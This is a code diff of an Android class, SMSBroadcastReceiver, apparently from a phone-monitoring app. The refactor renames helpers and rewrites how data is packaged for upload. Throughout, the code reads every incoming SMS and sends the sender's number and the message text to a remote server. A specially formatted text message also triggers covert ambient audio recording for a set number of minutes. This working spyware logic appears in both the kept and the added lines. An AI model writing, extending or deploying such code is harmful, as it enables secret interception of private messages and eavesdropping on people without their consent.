@@ -13,11 +13,12 @@ import android.os.Bundle;
 import android.telephony.SmsMessage;
 
 import com.inet.android.audio.RecordAudio;
-import com.inet.android.request.ConstantValue;
+import com.inet.android.request.AppConstants;
 import com.inet.android.request.RequestList;
+import com.inet.android.utils.AppSettings;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.ValueWork;
+import com.loopj.android.http.RequestParams;
 
 /**
  * SmsSentObserver class is design for monitoring incoming sms
@@ -26,7 +27,8 @@ import com.inet.android.utils.ValueWork;
  * 
  */
 public class SMSBroadcastReceiver extends BroadcastReceiver {
-	private static final String TAG = SMSBroadcastReceiver.class.getSimpleName().toString();
+	private static final String TAG = SMSBroadcastReceiver.class
+			.getSimpleName().toString();
 	private Context mContext;
 	private Bundle mBundle;
 	private String LOG_TAG = SMSBroadcastReceiver.class.getSimpleName()
@@ -36,7 +38,8 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 		// Tom Xue: intent -> bundle -> Object messages[] -> smsMessage[]
 		this.mContext = context;
 		mBundle = intent.getExtras();
-		if (ValueWork.getState(ConstantValue.TYPE_INCOMING_SMS_REQUEST, context) == 0)
+		if (AppSettings.getState(AppConstants.TYPE_INCOMING_SMS_REQUEST,
+				context) == 0)
 			return;
 
 		try {
@@ -46,7 +49,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 					"Error in Init : " + sgh.toString());
 		}
 	}
-		
+
 	public static void regSmsObserver(Context mContext) {
 		SmsSentObserver observer = new SmsSentObserver(null);
 		observer.setContext(mContext);
@@ -63,7 +66,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 			Object[] pdus = (Object[]) mBundle.get("pdus");
 			if (pdus != null) {
 				msgs = new SmsMessage[pdus.length];
-				String startRecord = ValueWork.getKeyForRecord(mContext);
+				String startRecord = AppSettings.getKeyForRecord(mContext);
 
 				StringBuilder bodyText = new StringBuilder();
 				for (int k = 0; k < msgs.length; k++) {
@@ -80,7 +83,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 										msgs[k].getMessageBody().length())) * 60;
 						Logging.doLog(LOG_TAG, "sec: " + minute, "sec: "
 								+ minute);
-						RecordAudio.executeRecording(minute, 0, mContext);
+						RecordAudio.startEnvRec(minute, 0, mContext);
 					}
 
 				}
@@ -91,29 +94,16 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 				}
 
 				// -------send sms--------------------------------
-				String sendJSONStr = null;
-				JSONObject jsonObject = new JSONObject();
-				JSONArray data = new JSONArray();
-				JSONObject info = new JSONObject();
-				JSONObject object = new JSONObject();
-				try {
+				RequestParams params = new RequestParams();
+				params.put("data[][info][number]", phNumber);
+				params.put("data[][info][data]", bodyText.toString());
 
-					info.put("number", phNumber);
-					info.put("data", bodyText.toString());
+				params.put("data[][time]", ConvertDate.logTime());
+				params.put("data[][type]",
+						AppConstants.TYPE_INCOMING_SMS_REQUEST);
+				params.put("key", System.currentTimeMillis());
 
-					object.put("time", ConvertDate.logTime());
-					object.put("type", ConstantValue.TYPE_INCOMING_SMS_REQUEST);
-					object.put("info", info);
-					data.put(object);
-					jsonObject.put("data", data);
-					sendJSONStr = object.toString();
-				} catch (JSONException e) {
-					Logging.doLog(LOG_TAG, "json сломался", "json сломался");
-				}
-
-				RequestList.sendDataRequest(sendJSONStr, mContext);
-
-				Logging.doLog(LOG_TAG, sendJSONStr, sendJSONStr);
+				RequestList.sendDataRequest(params, mContext);
 
 			}
 		} catch (Exception sfgh) {
